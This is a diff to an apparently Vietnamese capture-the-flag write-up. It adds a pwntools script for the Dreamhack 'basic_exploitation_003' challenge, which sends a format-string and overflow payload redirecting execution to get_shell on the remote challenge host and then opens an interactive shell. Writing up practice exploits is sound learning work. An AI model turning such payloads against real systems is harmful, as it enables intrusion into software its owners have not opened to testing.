@@ -376,6 +376,22 @@ payload += p32(exe.sym['get_shell'] + 1)
 
 ![image](https://user-images.githubusercontent.com/111769169/227506310-2a45dfee-823a-4a99-b958-5027d55031ae.png)
 
+```python
+from pwn import *
+
+exe = ELF("./basic_exploitation_003")
+# r = process(exe.path)
+r = remote("host3.dreamhack.games", 18012)
+# gdb.attach(r, gdbscript='''
+#            b* main+84
+#            c
+#            ''')
+input()
+payload = b"%37$p" * 16 + b"a" * 12
+payload += p32(exe.sym['get_shell'] + 1)
+r.send(payload)
+r.interactive()
+```
 # shell_basic
 
 ## Ý tưởng
